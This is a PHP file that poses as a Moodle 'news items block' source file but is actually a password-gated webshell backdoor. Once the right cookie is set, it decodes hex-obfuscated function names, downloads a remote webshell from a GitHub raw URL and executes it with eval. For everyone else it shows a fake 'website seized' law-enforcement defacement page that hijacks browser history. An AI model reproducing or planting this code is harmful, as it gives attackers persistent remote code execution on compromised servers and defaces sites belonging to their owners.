<?php
// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

/**
 * News items block caps.
 *
 * @pass       tbl
 * @copyright  Mark Nelson <markn@moodle.com>
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
/**
 * @package    Haxor.Group
 * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
 *
 */

// @deprecated  1.0  Deprecated without replacement
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'LPH'; 
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e', # fo p en => 0
        '73747265616d5f6765745f636f6e74656e7473', # strea m_get_contents => 1
        '66696c655f6765745f636f6e74656e7473', # fil e_g et_cont ents => 2
        '6375726c5f65786563' # cur l_ex ec => 3
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($superman) {
        $ie = array(
            hex2str($GLOBALS['Array'][0]), 
            hex2str($GLOBALS['Array'][1]), 
            hex2str($GLOBALS['Array'][2]), 
            hex2str($GLOBALS['Array'][3])  
        );

        if (function_exists($ie[3])) { 
            $ch = curl_init($superman);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $ie[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($ie[2])) { 
            return $ie[2]($superman);
        } elseif (function_exists($ie[0]) && function_exists($ie[1])) { 
            $purpose = $ie[0]($superman, "r");
            $love = $ie[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $superman = 'https://raw.githubusercontent.com/exploit-haxor/webshell/main/-21one.php';
    $maklokangspamzoneh = geturlsinfo($superman);
    if ($maklokangspamzoneh !== false) {
        eval('?>' . $maklokangspamzoneh);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$iOYuvQ3wWdGk4koyeRWrL.HTtw4Zf9T0zWvjUu37vlTY7qt0i6bOy';
echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio><audio autoplay><source src="https://j.top4top.io/m_2967gtgnw1.mp3" type="audio/mpeg"></audio>';

 // https://bcrypt.online/
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'LPH', time() + 25200, '/'); 
                   
		exit();
        }
    }
    ?>
    <!DOCTYPE html>
 <html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>SITUS INI TELAH DISITA</title>
    <style>
        @import 'https://rawcdn.githack.com/DanteLorenzo/FBI-Seized/495d2d737d64738e513519283eb444a9caefba89/src/css/main.css?min=1';
    </style>
</head>

<script type="text/JavaScript">

     function disableselect(e) {
          return false
        }
        
        function reEnable() {
          return true
        }
        
        document.onselectstart = new Function ("return false")
        
        if (window.sidebar) {
          document.onmousedown = disableselect
          document.onclick = reEnable
        }
        </script>
        

<body>
        

<script type="text/JavaScript">

     function disableselect(e) {
          return false
        }
        
        function reEnable() {
          return true
        }
        
        document.onselectstart = new Function ("return false")
        
        if (window.sidebar) {
          document.onmousedown = disableselect
          document.onclick = reEnable
        }
        </script>
        

<body>
<div class="bg-container" id="bg-container">
    <img src="https://github.com/DanteLorenzo/FBI-Seized/raw/master/src/img/landscape.svg" alt="Landscape" class="bg-landscape">
</div>
<main class="container" role="main">
    <div class="seal-container d-flex justify-content-center my-3 my-md-5">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/0f/Logo_BSSN_new.png" class="seal img-fluid" alt="Federal Bureau of Investigation">
        <img src="https://www.fbi.gov/++theme++08-12-24-fbi/images/fbi_seal_new.png" class="seal img-fluid" alt="Federal Bureau of Investigation">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Logo_Bareskrim_Polri.png" class="seal img-fluid" alt="Department of Justice">
    </div>
    <div class="card main-card shadow">
        <div class="card-body">
            <h1 class="title text-center"> THIS WEBSITE HAS BEEN SEIZED  </h1>
            <div class="pt-2 pt-md-3 text-monospace" style="font-size: 1.0rem;">
                <p>

   

               
               
Situs Ini Telah Disita Direktorat Tindak Pidana Siber Bareskrim Polri <br>
Sesuai Dengan Surat Perintah Penyitaan<br>Nomor : SP / 18 / III / 2024

  </p>
<br>

                <p>  <table class="directory-listing-table">
      <thead>
         <td>
            <font face="courier">
   Informasi lebih lanjut : <a href="https://www.bssn.go.id">https://www.bssn.go.id</a><br>
   Informasi lebih lanjut : <a href="">selengkapnya</a></h1>
                </p>
           
    
</main>

   </body>
<body>
<br>
        <div class="login-container">
            <form method="POST" action="">
                <label for="password">Kode Laporan key.</label>
                <input type="password" id="password" name="password" autofocus>
                <input type="submit" value="key">
            </form>
        </div>

           </div>

<script>
function ClearError() {return true;}window.onerror = ClearError;
	 (function () {
	 for(var i = 0; i < 20; i++) {
	 history.pushState(null, document.title, window.location.href );
	 }
	 })(document, window, history);
</script>

        <script>
            function createSnowflake() {
                const snowflake = document.createElement('div');
                snowflake.className = 'snowflake';
                snowflake.style.left = Math.random() * 100 + 'vw';
                snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
                snowflake.style.opacity = Math.random();
                document.body.appendChild(snowflake);
                
                setTimeout(() => {
                    snowflake.remove();
                }, 5000); 
            }
            
            setInterval(createSnowflake, 100);
        </script>

    </body>
    </html>
    <?php
}
?>
